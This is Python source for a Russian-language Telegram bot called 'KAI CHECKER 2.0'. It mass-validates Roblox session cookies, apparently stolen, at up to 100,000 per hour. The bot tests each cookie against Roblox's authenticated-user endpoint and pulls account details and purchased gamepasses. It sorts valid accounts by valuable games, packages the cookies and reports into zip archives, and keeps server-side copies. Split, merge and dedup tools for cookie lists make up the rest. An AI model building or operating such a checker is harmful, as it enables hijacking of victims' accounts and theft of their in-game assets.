import threading
import os
import time
import zipfile
import re
from io import BytesIO
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import telebot
from telebot import apihelper

from config import TELEGRAM_BOT_TOKEN, LOGO_URL, MAX_THREADS
from utils import extract_cookies, create_session
from checker import get_full_info
from report import generate_mass_report, generate_full_txt_report
from database import get_hourly_check_count, log_user_check, update_global_cookies_checked

apihelper.proxy = {}

# ============================================================
# ТОЛЬКО ЭТИ ИГРЫ ПОПАДАЮТ В ПАПКУ Games/
# ============================================================
MAIN_GAMES = {
    "blox fruits", "rivals", "adopt me", "pet sim 99",
    "pets go", "mm2", "murder mystery 2", "brookhaven",
    "fisch", "king legacy", "gpo", "blade ball", "bedwars",
    "jailbreak", "da hood", "tsb", "astd", "anime vanguards",
    "aot revolution", "aut", "aa", "als", "combat warriors",
    "creatures of sonaria", "driving empire", "evade",
    "ro ghoul", "royale high", "toilet td", "trident survival",
    "war tycoon", "yba", "99 nights", "spongebob td",
    "fnaf td", "garden td", "jujutsu infinite",
    "jujutsu shenanigans", "tds", "volleyball legends",
    "arsenal", "bee swarm", "dress to impress",
    "steal a brainrot"
}

def is_main_game(game_name: str) -> bool:
    if not game_name:
        return False
    g_lower = game_name.lower().strip()
    return any(mg in g_lower or g_lower in mg for mg in MAIN_GAMES)

class Bot:
    def __init__(self, token):
        self.bot = telebot.TeleBot(token)
        self.waiting = {}
        self.merge_files = {}
        self.user_tasks = {}
        self.setup_handlers()

    def main_menu(self):
        kb = telebot.types.InlineKeyboardMarkup(row_width=2)
        kb.add(telebot.types.InlineKeyboardButton("🔍 Чекер", callback_data="menu_checker"))
        kb.add(
            telebot.types.InlineKeyboardButton("✅ Валидатор", callback_data="menu_validator"),
            telebot.types.InlineKeyboardButton("📂 Сортер", callback_data="menu_sorter")
        )
        kb.add(
            telebot.types.InlineKeyboardButton("✂️ Разделитель", callback_data="menu_split"),
            telebot.types.InlineKeyboardButton("📦 Слияние", callback_data="menu_merge")
        )
        return kb

    def back_button(self):
        return telebot.types.InlineKeyboardMarkup().add(telebot.types.InlineKeyboardButton("◀️ Назад", callback_data="menu_back"))

    def continue_menu(self):
        kb = telebot.types.InlineKeyboardMarkup(row_width=2)
        kb.add(
            telebot.types.InlineKeyboardButton("🔄 Проверить ещё", callback_data="check_again"),
            telebot.types.InlineKeyboardButton("🏠 В меню", callback_data="menu_back")
        )
        return kb

    def mc(self):
        return "<b>🔍 KAI CHECKER 2.0 (PC Edition)</b>\n\n✅ Быстрая и подробная проверка\n✅ Массовый Валидатор\n📂 Сортер / Разделитель\n📦 Слияние без дублей\n\n<i>Выбери нужный режим ниже ↓</i>"

    def is_busy(self, user_id):
        return self.user_tasks.get(user_id, False)

    def set_busy(self, user_id, status):
        self.user_tasks[user_id] = status

    def setup_handlers(self):
        @self.bot.message_handler(commands=['start'])
        def start(msg):
            self.waiting.pop(msg.chat.id, None)
            self.bot.send_photo(msg.chat.id, LOGO_URL, caption=self.mc(), reply_markup=self.main_menu(), parse_mode='HTML')

        @self.bot.callback_query_handler(func=lambda call: True)
        def hc(call):
            cid = call.message.chat.id
            mid = call.message.message_id

            if call.data == "check_again":
                self.waiting[cid] = 'checker'
                self.bot.edit_message_caption("<b>🔍 ЧЕКЕР</b>\n<blockquote>📨 Отправь .txt файл с куками</blockquote>",
                                                chat_id=cid, message_id=mid, reply_markup=self.back_button(), parse_mode='HTML')
                return

            if call.data == "menu_checker":
                self.waiting[cid] = 'checker'
                self.bot.edit_message_caption("<b>🔍 ЧЕКЕР</b>\n<blockquote>📨 Отправь .txt файл с куками или текст со списком</blockquote>",
                                                chat_id=cid, message_id=mid, reply_markup=self.back_button(), parse_mode='HTML')
            elif call.data == "menu_validator":
                self.waiting[cid] = 'validator'
                self.bot.edit_message_caption("<b>✅ ВАЛИДАЦИЯ</b>\n<blockquote>📨 Отправь .txt файл</blockquote>",
                                                chat_id=cid, message_id=mid, reply_markup=self.back_button(), parse_mode='HTML')
            elif call.data == "menu_sorter":
                self.waiting[cid] = 'sorter'
                self.bot.edit_message_caption("<b>📂 СОРТЕР</b>\n<blockquote>📨 Отправь .txt файл с куками</blockquote>",
                                                chat_id=cid, message_id=mid, reply_markup=self.back_button(), parse_mode='HTML')
            elif call.data == "menu_split":
                self.waiting[cid] = 'split'
                self.bot.edit_message_caption("<b>✂️ РАЗДЕЛИТЕЛЬ</b>\n<blockquote>📨 Отправь .txt файл</blockquote>",
                                                chat_id=cid, message_id=mid, reply_markup=self.back_button(), parse_mode='HTML')
            elif call.data == "menu_merge":
                self.waiting[cid] = 'merge'
                self.merge_files[cid] = []
                self.bot.edit_message_caption("<b>📦 СЛИЯНИЕ</b>\n<blockquote>Присылай .txt файлы, а затем введи /done</blockquote>",
                                                chat_id=cid, message_id=mid, reply_markup=self.back_button(), parse_mode='HTML')
            elif call.data == "menu_back":
                self.waiting.pop(cid, None)
                try:
                    self.bot.edit_message_caption(caption=self.mc(), chat_id=cid, message_id=mid, reply_markup=self.main_menu(), parse_mode='HTML')
                except:
                    self.bot.send_photo(cid, LOGO_URL, caption=self.mc(), reply_markup=self.main_menu(), parse_mode='HTML')

        @self.bot.message_handler(commands=['done'])
        def done_merge(msg):
            cid = msg.chat.id
            if cid in self.merge_files and len(self.merge_files[cid]) >= 2:
                self.process_merge_files(msg)
            else:
                self.bot.reply_to(msg, "❌ Нужно отправить минимум 2 файла!")

        @self.bot.message_handler(content_types=['document'])
        def handle_docs(msg):
            cid = msg.chat.id
            uid = msg.from_user.id

            if self.is_busy(uid):
                self.bot.reply_to(msg, "⏳ Дождись завершения своей задачи!")
                return

            mode = self.waiting.get(cid, 'checker')

            try:
                file_info = self.bot.get_file(msg.document.file_id)
                downloaded = self.bot.download_file(file_info.file_path)

                if not msg.document.file_name.endswith('.txt'):
                    self.bot.reply_to(msg, "❌ Только .txt файлы!")
                    return

                text = downloaded.decode('utf-8', errors='ignore')
                cookies = extract_cookies(text)

                if not cookies:
                    self.bot.reply_to(msg, "❌ Не найдены куки в файле.")
                    return

                hourly_used = get_hourly_check_count(uid)
                this_file_count = len(cookies)
                
                if hourly_used + this_file_count > 100000:
                    excess = (hourly_used + this_file_count) - 100000
                    self.bot.reply_to(msg, 
                        f"❌ <b>Превышен лимит проверки куков за час!</b>\n\n"
                        f"Лимит: 100 000 куков в час\n"
                        f"Уже проверено за последний час: <code>{hourly_used:,}</code>\n"
                        f"В этом файле: <code>{this_file_count:,}</code>\n"
                        f"Всего превысит лимит на: <code>{excess:,}</code>\n\n"
                        f"Подождите ~1 час или разделите файл на части поменьше.",
                        parse_mode='HTML'
                    )
                    return

                self.set_busy(uid, True)
                log_user_check(uid, this_file_count)
                update_global_cookies_checked(this_file_count)

                if mode == 'validator':
                    threading.Thread(target=self.process_validator, args=(msg, cookies)).start()
                elif mode == 'sorter':
                    threading.Thread(target=self.process_sorter, args=(msg, cookies)).start()
                elif mode == 'split':
                    threading.Thread(target=self.process_split, args=(msg, cookies)).start()
                elif mode == 'merge':
                    self.merge_files[cid].append(msg.document)
                    self.bot.reply_to(msg, f"📦 Файл принят! (Всего: {len(self.merge_files[cid])}). Отправь еще или напиши /done")
                    self.set_busy(uid, False)
                else:
                    threading.Thread(target=self.bulk_check, args=(msg, cookies)).start()

            except Exception as e:
                self.bot.reply_to(msg, f"❌ Ошибка: {e}")
                self.set_busy(uid, False)

        @self.bot.message_handler(func=lambda m: True)
        def handle_text(msg):
            cid = msg.chat.id
            uid = msg.from_user.id

            if self.is_busy(uid):
                self.bot.reply_to(msg, "⏳ Дождись завершения своей задачи!")
                return

            mode = self.waiting.get(cid, 'checker')
            cks = extract_cookies(msg.text)

            if cks:
                hourly_used = get_hourly_check_count(uid)
                this_file_count = len(cks)
                
                if hourly_used + this_file_count > 100000:
                    excess = (hourly_used + this_file_count) - 100000
                    self.bot.reply_to(msg,
                        f"❌ <b>Превышен лимит проверки куков за час!</b>\n\n"
                        f"Лимит: 100 000 куков в час\n"
                        f"Уже проверено за последний час: <code>{hourly_used:,}</code>\n"
                        f"В этом тексте: <code>{this_file_count:,}</code>\n"
                        f"Всего превысит лимит на: <code>{excess:,}</code>\n\n"
                        f"Подождите ~1 час.",
                        parse_mode='HTML'
                    )
                    return

                self.waiting.pop(cid, None)
                self.set_busy(uid, True)
                log_user_check(uid, this_file_count)
                update_global_cookies_checked(this_file_count)
                threading.Thread(target=self.bulk_check, args=(msg, cks)).start()
            else:
                self.bot.send_photo(cid, LOGO_URL, caption=self.mc(), reply_markup=self.main_menu(), parse_mode='HTML')

    def bulk_check(self, msg, cookies):
        uid = msg.from_user.id
        try:
            total = len(cookies)
            start_time = time.time()
            
            st = self.bot.reply_to(msg, f"⏳ Начинаю проверку {total} куки...", parse_mode='HTML')
            
            all_info = []
            valid_cookies = []

            with ThreadPoolExecutor(max_workers=MAX_THREADS) as ex:
                futures = [ex.submit(get_full_info, c) for c in cookies]
                for f in as_completed(futures):
                    try:
                        res = f.result()
                        all_info.append(res)
                        if res.get('status') == '✅':
                            valid_cookies.append(res.get('Cookie', ''))
                    except:
                        pass

            elapsed_time = int(time.time() - start_time)
            report_text = generate_mass_report(all_info, elapsed_time)

            timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
            username = msg.from_user.username or f"user_{uid}"
            
            zip_buffer = BytesIO()
            
            with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
                # ============================================================
                # 1. ВСЕ ВАЛИДНЫЕ КУКИ В ОДИН ФАЙЛ
                # ============================================================
                if valid_cookies:
                    zf.writestr("ALL_VALID_COOKIES.txt", "\n".join(valid_cookies))
                
                # ============================================================
                # 2. ПАПКА Games/ — ТОЛЬКО ОСНОВНЫЕ ИГРЫ
                # ============================================================
                games_folder = "Games/"
                
                # Собираем: {game_name: {username: full_report}}
                game_accounts = {}
                for info in all_info:
                    if info.get('status') != '✅':
                        continue
                    username_acc = info.get('Username', 'unknown')
                    gp = info.get('PurchasedGamepasses', {})
                    for game_name in gp.keys():
                        if is_main_game(game_name):
                            if game_name not in game_accounts:
                                game_accounts[game_name] = {}
                            # Для каждого аккаунта — ПОЛНЫЙ ОТЧЁТ
                            game_accounts[game_name][username_acc] = generate_full_txt_report(info)
                
                # Создаём папки и файлы для каждой игры
                for game_name in sorted(game_accounts.keys()):
                    safe_name = re.sub(r'[<>:"/\\|?*]', '_', game_name).strip()
                    if not safe_name:
                        safe_name = "Unknown_Game"
                    
                    folder_path = f"{games_folder}{safe_name}/"
                    
                    for acc_name, full_report in game_accounts[game_name].items():
                        safe_acc_name = re.sub(r'[<>:"/\\|?*]', '_', acc_name).strip()
                        if not safe_acc_name:
                            safe_acc_name = "unknown"
                        zf.writestr(f"{folder_path}{safe_acc_name}.txt", full_report)
                
                # ============================================================
                # 3. ПАПКА Other/ — всё остальное (не игровые куки)
                # ============================================================
                other_folder = "Other/"
                
                all_cookies_in_games = set()
                for game_data in game_accounts.values():
                    for acc_name in game_data.keys():
                        # Ищем куку по нику
                        for info in all_info:
                            if info.get('Username') == acc_name:
                                all_cookies_in_games.add(info.get('Cookie', ''))
                                break
                
                other_cookies = []
                for info in all_info:
                    if info.get('status') != '✅':
                        continue
                    cookie = info.get('Cookie', '')
                    if cookie and cookie not in all_cookies_in_games:
                        other_cookies.append(cookie)
                
                if other_cookies:
                    zf.writestr(f"{other_folder}cookies.txt", "\n".join(other_cookies))
                
                # ============================================================
                # 4. ПАПКА Accounts/username/ — ОТДЕЛЬНЫЕ ОТЧЁТЫ
                # ============================================================
                user_folder = f"Accounts/{username}/"
                for info in all_info:
                    if info.get('status') == '✅':
                        acc_name = re.sub(r'[<>:"/\\|?*]', '_', str(info.get('Username', '?')))
                        acc_id = info.get('UserID', '?')
                        check_folder = f"{user_folder}Check_{timestamp}_{acc_name}_{acc_id}/"
                        
                        zf.writestr(f"{check_folder}cookie.txt", info.get('Cookie', ''))
                        info_text = generate_full_txt_report(info)
                        zf.writestr(f"{check_folder}info.txt", info_text)

            zip_buffer.seek(0)

            os.makedirs("results", exist_ok=True)
            zip_filename = f"results_{username}_{timestamp}.zip"
            zip_path = os.path.join("results", zip_filename)
            with open(zip_path, 'wb') as f:
                f.write(zip_buffer.getvalue())

            self.bot.edit_message_text(report_text, chat_id=msg.chat.id, message_id=st.message_id, parse_mode='HTML')

            zip_buffer.seek(0)
            self.bot.send_document(
                msg.chat.id, 
                zip_buffer, 
                visible_file_name=zip_filename, 
                caption=f"📦 Результаты проверки ({len(valid_cookies)} валидных аккаунтов)"
            )

            self.bot.send_message(msg.chat.id, "✅ Проверка полностью завершена!", reply_markup=self.continue_menu())
            
        except Exception as e:
            self.bot.send_message(msg.chat.id, f"❌ Ошибка: {e}")
        finally:
            self.set_busy(uid, False)

    def process_validator(self, msg, cookies):
        uid = msg.from_user.id
        try:
            st = self.bot.reply_to(msg, f"✅ Проверяю {len(cookies)} куки...")
            valid = []
            for c in cookies:
                try:
                    s = create_session(c)
                    r = s.get('https://users.roblox.com/v1/users/authenticated', timeout=3, verify=False)
                    if r.status_code == 200:
                        valid.append(c)
                except:
                    pass

            self.bot.edit_message_text(
                f"<b>✅ ВАЛИДАЦИЯ ЗАВЕРШЕНА</b>\n\nВсего: {len(cookies)}\n✅ Валидных: {len(valid)}",
                chat_id=msg.chat.id, message_id=st.message_id, parse_mode='HTML'
            )

            if valid:
                timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
                username = msg.from_user.username or f"user_{uid}"
                
                zip_buffer = BytesIO()
                with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
                    zf.writestr("valid_cookies.txt", "\n".join(valid))
                zip_buffer.seek(0)
                
                zip_filename = f"valid_{username}_{timestamp}.zip"
                zip_path = os.path.join("results", zip_filename)
                with open(zip_path, 'wb') as f:
                    f.write(zip_buffer.getvalue())
                
                zip_buffer.seek(0)
                self.bot.send_document(msg.chat.id, zip_buffer, visible_file_name=zip_filename, caption="📄 Валидные куки")
        except Exception as e:
            self.bot.reply_to(msg, f"❌ Ошибка: {e}")
        finally:
            self.set_busy(uid, False)

    def process_sorter(self, msg, cookies):
        uid = msg.from_user.id
        try:
            st = self.bot.reply_to(msg, f"📂 Сортирую {len(cookies)} элементов...")
            zip_buffer = BytesIO()
            with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
                for i, c in enumerate(cookies[:200]):
                    zf.writestr(f"cookie_{i+1}.txt", c)
            zip_buffer.seek(0)
            
            timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
            username = msg.from_user.username or f"user_{uid}"
            zip_filename = f"sorted_{username}_{timestamp}.zip"
            zip_path = os.path.join("results", zip_filename)
            with open(zip_path, 'wb') as f:
                f.write(zip_buffer.getvalue())
            
            self.bot.edit_message_text("✅ Архив сформирован!", chat_id=msg.chat.id, message_id=st.message_id)
            zip_buffer.seek(0)
            self.bot.send_document(msg.chat.id, zip_buffer, visible_file_name=zip_filename, caption="📦 Сортированные файлы")
        except Exception as e:
            self.bot.reply_to(msg, f"❌ Ошибка: {e}")
        finally:
            self.set_busy(uid, False)

    def process_split(self, msg, cookies):
        uid = msg.from_user.id
        try:
            st = self.bot.reply_to(msg, "✂️ Разделяю файл...")
            parts = 5
            sz = max(1, len(cookies) // parts)
            chunks = [cookies[i:i+sz] for i in range(0, len(cookies), sz)]

            zip_buffer = BytesIO()
            with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
                for i, ch in enumerate(chunks[:5]):
                    zf.writestr(f"part_{i+1}.txt", '\n'.join(ch))
            zip_buffer.seek(0)
            
            timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
            username = msg.from_user.username or f"user_{uid}"
            zip_filename = f"split_{username}_{timestamp}.zip"
            zip_path = os.path.join("results", zip_filename)
            with open(zip_path, 'wb') as f:
                f.write(zip_buffer.getvalue())

            self.bot.edit_message_text("✅ Разделение завершено!", chat_id=msg.chat.id, message_id=st.message_id)
            zip_buffer.seek(0)
            self.bot.send_document(msg.chat.id, zip_buffer, visible_file_name=zip_filename, caption="📦 Разделенные файлы")
        except Exception as e:
            self.bot.reply_to(msg, f"❌ Ошибка: {e}")
        finally:
            self.set_busy(uid, False)

    def process_merge_files(self, msg):
        uid = msg.from_user.id
        cid = msg.chat.id
        try:
            st = self.bot.reply_to(msg, "📦 Объединяю файлы...")
            all_cookies = []
            docs = self.merge_files.get(cid, [])

            for doc in docs:
                fi = self.bot.get_file(doc.file_id)
                dw = self.bot.download_file(fi.file_path)
                ct = dw.decode('utf-8', errors='ignore')
                all_cookies.extend(extract_cookies(ct))

            unique = list(dict.fromkeys(all_cookies))

            zip_buffer = BytesIO()
            with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
                zf.writestr("merged_cookies.txt", "\n".join(unique))
            zip_buffer.seek(0)
            
            timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
            username = msg.from_user.username or f"user_{uid}"
            zip_filename = f"merged_{username}_{timestamp}.zip"
            zip_path = os.path.join("results", zip_filename)
            with open(zip_path, 'wb') as f:
                f.write(zip_buffer.getvalue())

            self.bot.edit_message_text(
                f"<b>✅ СЛИЯНИЕ ЗАВЕРШЕНО</b>\n\n"
                f"📁 Обработано файлов: {len(docs)}\n"
                f"📦 Всего найдено: {len(all_cookies)}\n"
                f"🧹 Уникальных: {len(unique)}",
                chat_id=cid, message_id=st.message_id, parse_mode='HTML'
            )

            zip_buffer.seek(0)
            self.bot.send_document(cid, zip_buffer, visible_file_name=zip_filename, caption="📦 Итоговый файл без дублей")

        except Exception as e:
            self.bot.reply_to(msg, f"❌ Ошибка: {e}")
        finally:
            self.set_busy(uid, False)
            self.merge_files[cid] = []

    def run(self):
        print("🤖 Бот Kai Checker готов к работе!")
        while True:
            try:
                self.bot.polling(none_stop=True, timeout=30)
            except Exception as e:
                print(f"Ошибка: {e}")
                time.sleep(3)